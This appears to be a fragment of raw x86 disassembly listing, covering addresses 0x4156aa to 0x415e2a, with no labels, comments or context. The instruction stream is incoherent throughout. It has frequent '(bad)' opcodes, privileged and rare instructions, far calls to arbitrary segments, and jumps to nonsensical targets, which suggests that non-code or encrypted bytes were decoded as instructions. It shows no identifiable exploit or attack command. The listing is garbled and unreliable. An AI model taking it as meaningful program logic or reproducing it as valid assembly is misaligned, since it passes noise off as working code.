  4156aa:	mov    al,0xd1
  4156ac:	inc    edx
  4156ad:	xor    esp,DWORD PTR [edi-0x3b]
  4156b0:	jbe    0x4156c3
  4156b2:	cdq    
  4156b3:	aam    0x98
  4156b5:	dec    eax
  4156b6:	ficom  DWORD PTR [ecx-0x2b]
  4156ba:	mov    al,ds:0xdd65117e
  4156bf:	cs repnz iret 
  4156c2:	std    
  4156c3:	int    0xd
  4156c5:	dec    ebp
  4156c6:	loop   0x41565b
  4156c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156c9:	sub    ah,ah
  4156cb:	loop   0x415693
  4156cd:	repz xabort 0x55
  4156d1:	(bad)  
  4156d2:	dec    edi
  4156d3:	dec    eax
  4156d4:	pop    edx
  4156d5:	sti    
  4156d6:	inc    ebx
  4156d7:	pusha  
  4156d8:	ret    
  4156d9:	js     0x415722
  4156db:	and    DWORD PTR [eax-0x36],ebp
  4156de:	addr16 push ds
  4156e0:	pop    esi
  4156e1:	lods   eax,DWORD PTR ds:[esi]
  4156e2:	shl    DWORD PTR [ebx],1
  4156e4:	adc    DWORD PTR [eax+0x1b],ecx
  4156e7:	adc    ecx,DWORD PTR ds:0xcb44452f
  4156ed:	test   DWORD PTR [ebx],edi
  4156ef:	addr16 sub al,0xde
  4156f2:	nop
  4156f3:	push   si
  4156f5:	xchg   esi,eax
  4156f6:	or     bh,BYTE PTR [ebp+0x10]
  4156f9:	repz pop ebx
  4156fb:	out    0xeb,al
  4156fd:	cs xchg ecx,eax
  4156ff:	inc    esp
  415700:	das    
  415701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415702:	js     0x4156e2
  415704:	ret    0x4910
  415707:	mov    bh,0xf8
  415709:	xchg   ebp,ebx
  41570b:	aas    
  41570c:	js     0x41574e
  41570e:	imul   ebx,esp,0xffffffdc
  415711:	inc    ebx
  415712:	dec    ebp
  415713:	inc    ebx
  415714:	mov    BYTE PTR [edi-0x272818ab],bl
  41571a:	outs   dx,DWORD PTR ds:[esi]
  41571b:	ret    
  41571c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41571d:	in     eax,dx
  41571e:	in     al,dx
  41571f:	pop    ebx
  415720:	pop    ds
  415721:	das    
  415722:	js     0x415796
  415724:	jecxz  0x415771
  415726:	xchg   esi,eax
  415727:	out    0x3c,al
  415729:	ret    0x990a
  41572c:	pop    eax
  41572d:	pop    ecx
  41572e:	repz (bad) 
  415730:	push   0x12185603
  415735:	adc    al,BYTE PTR [esi+0x32846a94]
  41573b:	test   al,0x91
  41573d:	sub    eax,0x83014c6b
  415742:	cmp    bl,BYTE PTR [esi-0x2a]
  415745:	xor    BYTE PTR [esi],dh
  415747:	call   0xc5c1:0x4d5736a3
  41574e:	fs leave 
  415750:	dec    eax
  415751:	shl    DWORD PTR [ebx+0x3b],0xc2
  415755:	mov    es,WORD PTR [edi-0x4d]
  415758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415759:	fs sahf 
  41575b:	sbb    DWORD PTR [ecx],ecx
  41575d:	test   BYTE PTR [ebx-0x79],0xe5
  415761:	sbb    al,0xb0
  415763:	sub    eax,0x80e729e6
  415768:	loop   0x415742
  41576a:	mov    edi,0xc3d870f0
  41576f:	sbb    ebp,DWORD PTR [edx-0x6d86e525]
  415775:	(bad)  
  415776:	adc    dh,BYTE PTR [esi-0x62dd9eed]
  41577c:	in     al,dx
  41577d:	push   esp
  41577e:	in     eax,0x38
  415780:	adc    BYTE PTR [esi-0x25cbbec8],0x7f
  415787:	add    dl,BYTE PTR ds:0xac342aca
  41578d:	jp     0x4157d7
  41578f:	lods   eax,DWORD PTR ds:[esi]
  415790:	dec    BYTE PTR ds:[edi-0x1429e91b]
  415797:	lods   eax,DWORD PTR ds:[esi]
  415798:	iret   
  415799:	xor    ecx,DWORD PTR [ebp-0x661e8a0f]
  41579f:	(bad)  
  4157a0:	rcr    DWORD PTR [edi+ecx*2+0x38],1
  4157a4:	enter  0xe72d,0xfe
  4157a8:	adc    eax,0x1ee2cc10
  4157ad:	xchg   edx,eax
  4157ae:	rdmsr  
  4157b0:	sub    BYTE PTR [edi],0x1e
  4157b3:	jp     0x415744
  4157b5:	lock pop eax
  4157b7:	mov    ss,WORD PTR [eax]
  4157b9:	dec    eax
  4157ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157bb:	and    ch,al
  4157bd:	aam    0x94
  4157bf:	pop    esp
  4157c0:	sbb    BYTE PTR [edi-0x5de4c1e2],cl
  4157c6:	xor    al,0x38
  4157c8:	xchg   DWORD PTR [esi],edx
  4157ca:	pop    esi
  4157cb:	push   es
  4157cc:	pop    ebx
  4157cd:	and    al,0xb2
  4157cf:	retf   0xdcec
  4157d2:	dec    ecx
  4157d3:	dec    esi
  4157d4:	mov    ah,0x59
  4157d6:	je     0x415793
  4157d8:	pusha  
  4157d9:	fwait
  4157da:	jne    0x415819
  4157dc:	pop    es
  4157dd:	ja     0x4157bb
  4157df:	scas   eax,DWORD PTR es:[edi]
  4157e0:	shr    DWORD PTR [ebx+0x6f],0x72
  4157e4:	pusha  
  4157e5:	or     BYTE PTR [edi-0x3622ef89],bh
  4157eb:	fild   QWORD PTR [edi+esi*2+0x34]
  4157ef:	add    BYTE PTR [eax+0x43],0x6
  4157f3:	sar    BYTE PTR [ebx+eax*4],1
  4157f6:	inc    eax
  4157f7:	jmp    0x1b1d9859
  4157fc:	lds    edx,FWORD PTR [esi+esi*4-0x482e0766]
  415803:	idiv   BYTE PTR [edx+ecx*1]
  415806:	sub    DWORD PTR [edx-0x3b8af86],ebx
  41580c:	sar    DWORD PTR [edx-0x703b903e],0x9b
  415813:	dec    esp
  415814:	ror    DWORD PTR [ebp+0x5f428ea0],1
  41581a:	mov    cl,ch
  41581c:	push   edi
  41581d:	pusha  
  41581e:	(bad)  
  41581f:	and    eax,0x93c335f3
  415824:	adc    al,0x74
  415826:	xchg   ebx,eax
  415827:	jbe    0x415802
  415829:	ror    BYTE PTR [esi+ebx*1-0x52],1
  41582d:	gs jp  0x415890
  415830:	and    al,0xe7
  415832:	sbb    al,0xcb
  415834:	adc    al,0xe4
  415836:	into   
  415837:	aad    0x56
  415839:	cmp    bl,dh
  41583b:	add    edi,edx
  41583d:	add    edi,edi
  41583f:	mov    edi,0x6ba44c61
  415844:	push   cs
  415845:	sub    eax,0xa0707ec2
  41584a:	dec    ecx
  41584b:	(bad)  
  41584d:	fild   DWORD PTR [eax]
  41584f:	jmp    0x8ce9:0xfe2da1b1
  415856:	test   edx,esp
  415858:	mov    bh,0xb1
  41585a:	mov    ah,0xf0
  41585c:	lahf   
  41585d:	mov    ds:0xd9fbc51d,eax
  415862:	lods   eax,DWORD PTR ds:[esi]
  415863:	sti    
  415864:	mov    ah,0x10
  415866:	inc    edi
  415867:	test   DWORD PTR [ebx],edi
  415869:	sar    ebp,1
  41586b:	add    ecx,DWORD PTR [ebp+0x64b7d0db]
  415871:	loope  0x4158b8
  415873:	adc    al,BYTE PTR [esi]
  415875:	mov    bl,0x95
  415877:	and    eax,0x73271c54
  41587c:	add    ebx,DWORD PTR [edi+0x4c938682]
  415882:	inc    edx
  415883:	inc    edi
  415884:	cmp    eax,0x142e4eff
  415889:	daa    
  41588a:	lods   eax,DWORD PTR ds:[esi]
  41588b:	xor    eax,0xa5b4232e
  415890:	add    edx,esp
  415892:	aad    0xe8
  415894:	sar    bh,cl
  415896:	jns    0x415893
  415898:	pop    esp
  415899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41589a:	rcl    BYTE PTR [ebx],0x9f
  41589d:	or     dl,BYTE PTR [esi-0x44]
  4158a0:	xchg   ebp,eax
  4158a1:	pop    ecx
  4158a2:	imul   ecx,DWORD PTR [esi],0x1a
  4158a5:	cmp    DWORD PTR [ecx],0x5f
  4158a8:	xchg   esi,eax
  4158a9:	adc    esi,DWORD PTR ds:0xcafee27b
  4158af:	inc    ecx
  4158b0:	(bad)  
  4158b1:	stc    
  4158b2:	retf   
  4158b3:	test   esp,0xc0b7aec6
  4158b9:	xor    DWORD PTR [ebx-0x33],esi
  4158bc:	retf   0x7ccc
  4158bf:	mov    edi,DWORD PTR [edx]
  4158c1:	mov    ch,0xf9
  4158c3:	mov    WORD PTR ds:0x22f1b421,ss
  4158c9:	lahf   
  4158ca:	sbb    eax,0xe2e44c
  4158cf:	push   ss
  4158d0:	test   al,0x52
  4158d2:	xchg   esi,eax
  4158d3:	daa    
  4158d4:	mov    WORD PTR [edi+esi*4],?
  4158d7:	jae    0x415919
  4158d9:	fsubr  DWORD PTR [eax]
  4158db:	xchg   ecx,eax
  4158dc:	(bad)  
  4158de:	cwde   
  4158df:	pop    ecx
  4158e0:	aad    0xd8
  4158e2:	xor    DWORD PTR [edx+0x1f],ebx
  4158e5:	outs   dx,BYTE PTR ds:[esi]
  4158e6:	out    dx,eax
  4158e7:	pushf  
  4158e8:	imul   ecx,DWORD PTR [edx],0x2e
  4158eb:	inc    ebp
  4158ec:	aam    0x16
  4158ee:	pusha  
  4158ef:	add    al,0xa8
  4158f1:	outs   dx,DWORD PTR ds:[esi]
  4158f2:	dec    edi
  4158f3:	push   ebx
  4158f4:	js     0x4158bf
  4158f6:	int    0xe5
  4158f8:	test   DWORD PTR [edi-0x73af1a3e],ecx
  4158fe:	and    al,0x14
  415900:	mov    ebp,0xa05678b1
  415905:	sub    BYTE PTR [edx],al
  415907:	jg     0x415948
  415909:	push   0xe7a19954
  41590e:	fisttp QWORD PTR [ebx+0x77]
  415911:	jecxz  0x415953
  415913:	ins    BYTE PTR es:[edi],dx
  415914:	jl     0x41598a
  415916:	mov    edi,0x6df97353
  41591b:	cdq    
  41591c:	xor    dl,bl
  41591e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41591f:	in     eax,dx
  415920:	mul    BYTE PTR [edi-0xe]
  415923:	pop    ebp
  415924:	ffree  st(6)
  415926:	push   ebp
  415927:	hlt    
  415928:	out    0x89,al
  41592a:	or     al,0xfa
  41592c:	adc    al,0x31
  41592e:	rol    BYTE PTR [ebx-0x130a3772],cl
  415934:	adc    eax,0x5428016
  415939:	cmp    al,0x4e
  41593b:	adc    DWORD PTR [eax+0x2],esp
  41593e:	push   ds
  41593f:	jnp    0x41591d
  415941:	inc    esi
  415942:	jno    0x4159af
  415944:	mov    dh,0x39
  415946:	mov    BYTE PTR [esp+eax*2+0x778da9b5],al
  41594d:	cmp    al,0x80
  41594f:	dec    BYTE PTR ds:0xede41e79
  415955:	frstor [edi-0x71]
  415958:	xor    esp,esi
  41595a:	mov    cl,al
  41595c:	pop    ss
  41595d:	xchg   ebx,eax
  41595e:	fucomp st(1)
  415960:	dec    edi
  415961:	add    DWORD PTR [ebp+0x3f],ebp
  415964:	idiv   BYTE PTR [eax+0x1b7c74a4]
  41596a:	inc    esi
  41596b:	jge    0x415958
  41596d:	gs mov dh,0x58
  415970:	xchg   ebx,eax
  415971:	hlt    
  415972:	mov    bh,0xd1
  415974:	scas   eax,DWORD PTR es:[edi]
  415975:	ffreep st(2)
  415977:	stos   DWORD PTR es:[edi],eax
  415978:	cwde   
  415979:	(bad)  
  41597b:	pop    ebx
  41597c:	xchg   BYTE PTR [eax],al
  41597e:	mov    bl,dh
  415980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415981:	jecxz  0x41593e
  415983:	mov    WORD PTR [ebp+0x31e91845],?
  415989:	mov    ds:0x32a8d1d5,al
  41598e:	mov    BYTE PTR [esi-0x14],ch
  415991:	mov    ch,0x8b
  415993:	out    0xe4,eax
  415995:	es out dx,al
  415997:	and    BYTE PTR [esp+edx*8+0x40cf4aa3],bl
  41599e:	ret    0xf94c
  4159a1:	outs   dx,BYTE PTR ds:[esi]
  4159a2:	call   0xaaa5:0xcccc2d63
  4159a9:	pop    edi
  4159aa:	call   0x4d238b79
  4159af:	and    BYTE PTR [ebx-0x604b44c5],ah
  4159b5:	push   ebp
  4159b6:	push   ebp
  4159b7:	inc    ecx
  4159b8:	pop    ss
  4159b9:	aad    0x22
  4159bb:	lods   eax,DWORD PTR ds:[esi]
  4159bc:	jb     0x4159b8
  4159be:	dec    eax
  4159bf:	enter  0xcd54,0xaa
  4159c3:	cmp    al,0x38
  4159c5:	sub    eax,0xf2303491
  4159ca:	dec    ebp
  4159cb:	popa   
  4159cc:	inc    ecx
  4159cd:	add    al,0xdd
  4159cf:	lds    edi,FWORD PTR [ebx+eax*2]
  4159d2:	aaa    
  4159d3:	add    al,0xea
  4159d5:	sbb    eax,0x110b0df3
  4159da:	ds test ah,dh
  4159dd:	imul   ebx,DWORD PTR ds:0x7e892c88,0xffffff9a
  4159e4:	fld    DWORD PTR [ecx-0x16]
  4159e7:	sbb    eax,0xe08d53e2
  4159ec:	push   edi
  4159ed:	or     DWORD PTR [ecx],edx
  4159ef:	stos   DWORD PTR es:[edi],eax
  4159f0:	mov    dl,0xb2
  4159f2:	or     dh,cl
  4159f4:	mov    ebx,0xfc545b16
  4159f9:	jns    0x41597b
  4159fb:	test   bl,ch
  4159fd:	icebp  
  4159fe:	es add ch,0x5
  415a02:	sub    DWORD PTR [eax],0xbd765070
  415a08:	inc    esp
  415a09:	fwait
  415a0a:	jg     0x415a76
  415a0c:	cmp    DWORD PTR [esp+ebp*4-0x73],esp
  415a10:	mov    esp,0x2f5d216f
  415a15:	cmp    BYTE PTR [esi-0x76],bl
  415a18:	fsubr  st,st(6)
  415a1a:	out    dx,eax
  415a1b:	xor    ecx,edx
  415a1d:	and    bh,bh
  415a1f:	cwde   
  415a20:	inc    ebp
  415a21:	cli    
  415a22:	ss iret 
  415a24:	mov    ecx,0x573c42e
  415a29:	jp     0x4159e5
  415a2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a2c:	sub    al,0x68
  415a2e:	xor    eax,0xf5d39cc1
  415a33:	cld    
  415a34:	mov    ?,WORD PTR [ebx-0x7bc7ab19]
  415a3a:	(bad)  
  415a3b:	pop    es
  415a3c:	push   edx
  415a3d:	cld    
  415a3e:	call   0x3d8e2f49
  415a43:	sbb    eax,0x74f90025
  415a48:	pop    esi
  415a49:	jle    0x415a39
  415a4b:	pusha  
  415a4c:	mov    eax,ds:0x6b7cc55a
  415a51:	pop    ebp
  415a52:	rcr    DWORD PTR [ebx],cl
  415a54:	pop    ds
  415a55:	and    ecx,esp
  415a57:	dec    edi
  415a58:	cmp    al,0x77
  415a5a:	or     ah,0xbb
  415a5d:	cmp    eax,0xc730fc7
  415a62:	dec    edx
  415a63:	dec    ebx
  415a64:	adc    ecx,DWORD PTR [esi+0x71294135]
  415a6a:	loopne 0x415add
  415a6c:	jo     0x415a43
  415a6e:	cmp    ah,dl
  415a70:	push   edi
  415a71:	inc    esp
  415a72:	idiv   DWORD PTR [eax]
  415a74:	adc    al,0xe9
  415a76:	inc    edx
  415a77:	(bad)  
  415a78:	ret    0x6ca6
  415a7b:	xor    dh,ah
  415a7d:	hlt    
  415a7e:	add    esi,DWORD PTR ds:0x85ec34a4
  415a84:	cdq    
  415a85:	in     al,dx
  415a86:	nop
  415a87:	sub    BYTE PTR [ebp-0x2c],ch
  415a8a:	das    
  415a8b:	push   ecx
  415a8c:	lahf   
  415a8d:	sub    al,0xd
  415a8f:	add    eax,0xb991a5d
  415a94:	jno    0x415a9b
  415a96:	adc    BYTE PTR [edx+0x106ccc1d],dl
  415a9c:	ror    ah,0xf3
  415a9f:	lea    edi,[edx+0x7b]
  415aa2:	inc    eax
  415aa3:	leave  
  415aa4:	dec    ebp
  415aa5:	inc    edi
  415aa6:	repnz xor DWORD PTR [ecx],0xd330e5f
  415aad:	retf   0xd027
  415ab0:	fistp  DWORD PTR [edi-0x35]
  415ab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ab4:	xlat   BYTE PTR ds:[ebx]
  415ab5:	adc    al,0xc0
  415ab7:	daa    
  415ab8:	out    dx,eax
  415ab9:	hlt    
  415aba:	fimul  WORD PTR [ebp-0x130852c6]
  415ac0:	adc    eax,0xbcb3996e
  415ac5:	push   esp
  415ac6:	pusha  
  415ac7:	scas   al,BYTE PTR es:[edi]
  415ac8:	test   al,0xab
  415aca:	sbb    BYTE PTR [ebp+0x59fae153],ah
  415ad0:	leave  
  415ad1:	aam    0xd8
  415ad3:	lods   al,BYTE PTR ds:[esi]
  415ad4:	pop    ss
  415ad5:	push   esi
  415ad6:	in     eax,dx
  415ad7:	jg     0x415a8d
  415ad9:	mov    bh,0x8a
  415adb:	call   0x17a5:0x8474f86e
  415ae2:	pop    esi
  415ae3:	rcr    BYTE PTR [edi-0x3a],cl
  415ae6:	push   0xffffffe7
  415ae8:	outs   dx,DWORD PTR ds:[esi]
  415ae9:	push   ss
  415aea:	ret    0x635e
  415aed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aee:	xchg   ebp,eax
  415aef:	add    DWORD PTR [edi-0x2e],edx
  415af2:	adc    eax,0x1842d72
  415af7:	xchg   edi,eax
  415af8:	js     0x415ad7
  415afa:	loopne 0x415b42
  415afc:	or     al,BYTE PTR [ebp+0x1]
  415aff:	xchg   DWORD PTR [ecx],ebp
  415b01:	dec    ebx
  415b02:	push   cs
  415b03:	xchg   ebp,eax
  415b04:	fisub  DWORD PTR ds:0xdb6c7c81
  415b0a:	sub    BYTE PTR [edi],0x89
  415b0d:	jns    0x415b0b
  415b0f:	sub    ch,BYTE PTR [eax+0x137417e2]
  415b15:	jmp    0x6353:0xc6e3b299
  415b1c:	push   ebp
  415b1d:	jne    0x415b06
  415b1f:	sub    eax,ecx
  415b21:	mov    edx,0x3beeb9cd
  415b26:	adc    BYTE PTR [ecx-0x116736f6],dl
  415b2c:	ja     0x415ba4
  415b2e:	or     esi,DWORD PTR [edi+0x1d]
  415b31:	inc    eax
  415b32:	loopne 0x415b27
  415b34:	mov    bl,0x1f
  415b36:	out    0x17,al
  415b38:	push   ecx
  415b39:	sub    ebp,0x51
  415b3c:	jae    0x415b0f
  415b3e:	mov    esp,0xec67e43d
  415b43:	ret    
  415b44:	sub    DWORD PTR [ebx],edi
  415b46:	bound  edi,QWORD PTR [ecx+edx*1-0x2b]
  415b4a:	dec    ecx
  415b4b:	(bad)  
  415b4c:	jmp    0xcaa2:0xb5d68ef7
  415b53:	mov    ebp,0x583d14e2
  415b58:	mul    BYTE PTR [esi]
  415b5a:	xchg   DWORD PTR [esi-0x4e],esp
  415b5d:	mov    es,WORD PTR [edx]
  415b5f:	mov    ds,WORD PTR [ebx-0x6bcb5238]
  415b65:	outs   dx,BYTE PTR ds:[esi]
  415b66:	adc    eax,0x883475f4
  415b6b:	ja     0x415bda
  415b6d:	and    eax,0xfe2a76b6
  415b72:	xchg   BYTE PTR [edx+0x4d348728],cl
  415b78:	mov    ebx,eax
  415b7a:	ins    BYTE PTR es:[edi],dx
  415b7b:	jb     0x415b63
  415b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b7e:	add    DWORD PTR [esp+eiz*8],esp
  415b81:	sbb    edx,DWORD PTR [eax+edx*4]
  415b84:	and    BYTE PTR [eax-0x7e70e053],0x8c
  415b8b:	xlat   BYTE PTR ds:[ebx]
  415b8c:	aas    
  415b8d:	ret    0x2ebd
  415b90:	aas    
  415b91:	jecxz  0x415b6b
  415b93:	or     dh,BYTE PTR [esi-0x3f]
  415b96:	mov    edx,0xe28d996d
  415b9b:	(bad)  
  415b9c:	xchg   edi,eax
  415b9d:	adc    BYTE PTR [eax-0x3c752d40],bl
  415ba3:	dec    ebx
  415ba4:	sbb    al,0x21
  415ba6:	(bad)  
  415ba8:	repz test DWORD PTR es:[esp+edi*2+0x6d],esp
  415bae:	adc    ebp,edx
  415bb0:	fidivr DWORD PTR gs:[ebx+0x28]
  415bb4:	sbb    cl,BYTE PTR [edi+0x35]
  415bb7:	gs inc ebx
  415bb9:	push   cs
  415bba:	pop    ss
  415bbb:	mov    cx,gs
  415bbe:	(bad)  
  415bbf:	mov    ch,0x63
  415bc1:	jne    0x415b47
  415bc3:	aaa    
  415bc4:	or     al,0x50
  415bc6:	sbb    bl,dl
  415bc8:	add    edx,DWORD PTR [edx-0x78]
  415bcb:	xor    al,0x9f
  415bcd:	push   ds
  415bce:	dec    ebp
  415bcf:	mov    ds:0x31774ac7,eax
  415bd4:	and    bh,BYTE PTR [eax+0x5f21db1d]
  415bda:	scas   al,BYTE PTR es:[edi]
  415bdb:	mov    bl,0x79
  415bdd:	xor    DWORD PTR [ebx+ebx*4],ebp
  415be0:	fistp  DWORD PTR [ebx+0x458a36b0]
  415be6:	lea    esi,[ecx+0x72]
  415be9:	idiv   edx
  415beb:	sub    ebp,DWORD PTR [ecx+0x3fc4a021]
  415bf1:	or     BYTE PTR [eax],0xc2
  415bf4:	jp     0x415ba7
  415bf6:	stc    
  415bf7:	loop   0x415c36
  415bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bfa:	popa   
  415bfb:	add    bl,BYTE PTR [edi+0x41]
  415bfe:	je     0x415c38
  415c00:	mov    dl,BYTE PTR [edx-0x31]
  415c03:	stos   BYTE PTR es:[edi],al
  415c04:	pop    ecx
  415c05:	into   
  415c06:	add    ch,BYTE PTR ds:0x9f85b9eb
  415c0c:	fdivr  QWORD PTR ds:0x2bf5a7ba
  415c12:	rcr    DWORD PTR [ebp-0x77c269d8],0x3c
  415c19:	daa    
  415c1a:	sub    DWORD PTR [edi+0x7],ebx
  415c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c1e:	mov    eax,0x47a0a2fc
  415c23:	cmp    dh,bh
  415c25:	add    DWORD PTR [ebx-0xc7733b0],edi
  415c2b:	fsubr  QWORD PTR [ecx-0x55]
  415c2e:	mov    al,0xcd
  415c30:	and    ebp,DWORD PTR cs:[esi+0x5]
  415c34:	mov    ebx,0xa08c764a
  415c39:	xor    ebx,DWORD PTR [eax+eax*1-0x4e445f1e]
  415c40:	push   eax
  415c41:	pusha  
  415c42:	push   ecx
  415c43:	scas   al,BYTE PTR es:[edi]
  415c44:	cld    
  415c45:	adc    DWORD PTR [ebp+0x26476085],ebp
  415c4b:	in     eax,dx
  415c4c:	pop    ss
  415c4d:	xor    ch,BYTE PTR [esi-0x40]
  415c50:	jnp    0x415c2d
  415c52:	gs push ss
  415c54:	(bad)  
  415c55:	sar    esi,cl
  415c57:	fsub   QWORD PTR [edi+ecx*1+0x26b98300]
  415c5e:	cmp    BYTE PTR [ebp+0x35],ch
  415c61:	je     0x415c93
  415c63:	or     DWORD PTR [edi+0x28],edi
  415c66:	rol    BYTE PTR [ebp+0x5b],cl
  415c69:	xor    DWORD PTR [ecx+0x7],edx
  415c6c:	retf   0x18f2
  415c6f:	cwde   
  415c70:	sub    ebx,DWORD PTR [eax]
  415c72:	icebp  
  415c73:	rcr    BYTE PTR [edi+0x3a],cl
  415c76:	(bad)
  415c79:	inc    edi
  415c7a:	sbb    eax,0x4b436aca
  415c7f:	push   edx
  415c80:	xor    BYTE PTR [ecx+0x7767e5a7],ch
  415c86:	mov    esp,0x1ee59da5
  415c8b:	ror    DWORD PTR [ecx+edx*4+0x12],0xd5
  415c90:	in     al,0x61
  415c92:	sub    ch,dh
  415c94:	or     BYTE PTR [edi],0xf
  415c97:	fisub  DWORD PTR [ebx+0x4a6b5b3c]
  415c9d:	cmp    DWORD PTR [ecx+esi*4-0x53],0xe7b030d8
  415ca5:	in     al,0xbe
  415ca7:	mov    dh,0x2b
  415ca9:	adc    bh,bh
  415cab:	add    BYTE PTR [edx-0x18],cl
  415cae:	pop    ds
  415caf:	out    dx,al
  415cb0:	adc    esi,esp
  415cb2:	mov    esi,0x736d6c0e
  415cb7:	sub    eax,0xff76875d
  415cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cbd:	push   ss
  415cbe:	mov    ebx,ebp
  415cc0:	push   ebp
  415cc1:	xchg   edx,eax
  415cc2:	fdiv   DWORD PTR [edx+0x8]
  415cc5:	aam    0xc1
  415cc7:	cwde   
  415cc8:	scas   al,BYTE PTR es:[edi]
  415cc9:	sub    edx,DWORD PTR [ebx+ecx*4]
  415ccc:	cli    
  415ccd:	push   es
  415cce:	popa   
  415ccf:	adc    eax,0xfc860023
  415cd4:	add    eax,0x7182db17
  415cd9:	mov    ecx,0x1e0f16c3
  415cde:	xchg   dh,dh
  415ce0:	lds    eax,FWORD PTR [ebx+0x4f]
  415ce3:	mov    al,BYTE PTR [eax+0x73]
  415ce6:	out    dx,al
  415ce7:	xor    eax,0x6baaf9d8
  415cec:	dec    edi
  415ced:	cdq    
  415cee:	or     al,BYTE PTR [ecx-0x7edb6ee]
  415cf4:	pop    edi
  415cf5:	mov    ebp,0x9dd765a5
  415cfa:	xor    DWORD PTR [edx-0x6c],eax
  415cfd:	jnp    0x415c98
  415cff:	push   edi
  415d00:	hlt    
  415d01:	aad    0x7
  415d03:	int3   
  415d04:	adc    al,0xf4
  415d06:	pop    eax
  415d07:	adc    ah,BYTE PTR [edi+0x65]
  415d0a:	mov    ah,0x22
  415d0c:	clc    
  415d0d:	addr16 cdq 
  415d0f:	outs   dx,BYTE PTR ds:[esi]
  415d10:	jge    0x415d6d
  415d12:	add    eax,0xf6395a66
  415d17:	adc    bl,dl
  415d19:	xchg   ecx,eax
  415d1a:	pop    eax
  415d1b:	dec    edx
  415d1c:	retf   0x72e
  415d1f:	pop    eax
  415d20:	or     ebx,0x53af3e1
  415d26:	repz mov dh,dh
  415d29:	lods   eax,DWORD PTR ds:[esi]
  415d2a:	push   cs
  415d2b:	cmp    ecx,esi
  415d2d:	call   0xcc06:0xc9b37b6
  415d34:	scas   eax,DWORD PTR es:[edi]
  415d35:	xchg   ebp,eax
  415d36:	std    
  415d37:	daa    
  415d38:	fs dec ecx
  415d3a:	data16 daa 
  415d3c:	fwait
  415d3d:	sbb    BYTE PTR [ebp+0x40ee62a4],al
  415d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d44:	jne    0x415cc6
  415d46:	mov    al,ds:0xa9ef1aee
  415d4b:	stos   BYTE PTR es:[edi],al
  415d4c:	les    esi,FWORD PTR [eax+0x43e4ef36]
  415d52:	pop    esp
  415d53:	popa   
  415d54:	(bad)  
  415d55:	pusha  
  415d56:	cmp    DWORD PTR [esp+edx*1],eax
  415d59:	jne    0x415d2f
  415d5b:	lods   al,BYTE PTR ds:[esi]
  415d5c:	sub    al,0x3e
  415d5e:	mov    al,0x3
  415d60:	lahf   
  415d61:	sbb    BYTE PTR [ecx+0x46],0x47
  415d65:	or     bh,BYTE PTR [eax]
  415d67:	mov    al,0xc5
  415d69:	(bad)  
  415d6a:	loope  0x415dc6
  415d6c:	fild   QWORD PTR [ecx+0x5e901ff1]
  415d72:	lods   al,BYTE PTR ds:[esi]
  415d73:	int3   
  415d74:	ret    0x1383
  415d77:	nop
  415d78:	les    edi,FWORD PTR [eax+0x7e]
  415d7b:	pop    eax
  415d7c:	dec    esp
  415d7d:	or     DWORD PTR [ecx+0x6f],esp
  415d80:	ret    
  415d81:	xchg   ebp,eax
  415d82:	into   
  415d83:	outs   dx,DWORD PTR ds:[esi]
  415d84:	push   esi
  415d85:	mov    DWORD PTR [ebx+0x60],eax
  415d88:	call   0x31c78532
  415d8d:	push   0x527effe9
  415d92:	loopne 0x415db3
  415d94:	ins    DWORD PTR es:[edi],dx
  415d95:	jbe    0x415db0
  415d97:	ficomp DWORD PTR [ebp+0x70]
  415d9a:	cld    
  415d9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d9c:	xor    eax,0xd6f886bd
  415da1:	push   eax
  415da2:	dec    BYTE PTR [esi+0x51]
  415da5:	cs mov ebp,0x1cb7a1d3
  415dab:	add    BYTE PTR [ebp-0x69],0x6f
  415daf:	scas   al,BYTE PTR es:[edi]
  415db0:	dec    ebp
  415db1:	jmp    0x415e04
  415db3:	push   eax
  415db4:	push   edi
  415db5:	add    al,0xd4
  415db7:	pusha  
  415db8:	pop    edx
  415db9:	or     eax,0x80ab0027
  415dbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dbf:	cmp    DWORD PTR [ecx+0x26],ebx
  415dc2:	out    dx,al
  415dc3:	inc    eax
  415dc4:	icebp  
  415dc5:	jge    0x415d8a
  415dc7:	mov    dl,0xe3
  415dc9:	jb     0x415dba
  415dcb:	test   al,0x61
  415dcd:	scas   al,BYTE PTR es:[edi]
  415dce:	jae    0x415e01
  415dd0:	ret    
  415dd1:	imul   eax,ebp,0x8ab8f961
  415dd7:	cwde   
  415dd8:	xchg   edi,eax
  415dd9:	inc    edx
  415dda:	fldenv [edi+0x24]
  415ddd:	pop    edx
  415dde:	jmp    0xea5a7688
  415de3:	and    esi,DWORD PTR [esi+0x6d8006b8]
  415de9:	aaa    
  415dea:	adc    eax,0xa6266645
  415def:	in     al,dx
  415df0:	ret    
  415df1:	add    dl,bl
  415df3:	in     al,dx
  415df4:	sahf   
  415df5:	mov    ds:0x5fe2ab0d,eax
  415dfa:	js     0x415e14
  415dfc:	pop    esp
  415dfd:	retf   0x79eb
  415e00:	jns    0x415de9
  415e02:	dec    ebp
  415e03:	hlt    
  415e04:	or     dl,BYTE PTR [edx]
  415e06:	sub    esi,0xffffff94
  415e09:	fbld   TBYTE PTR [esi+0x60a34881]
  415e0f:	mov    ecx,0xc0995db3
  415e14:	pop    edx
  415e15:	adc    DWORD PTR [ebx-0x16],esp
  415e18:	call   0xc0fa:0xff40f39c
  415e1f:	sub    BYTE PTR [ecx-0x5],dl
  415e22:	mov    ds:0xb583f91b,al
  415e27:	clc    
  415e28:	mov    bh,0x8f
  415e2a:	hlt    
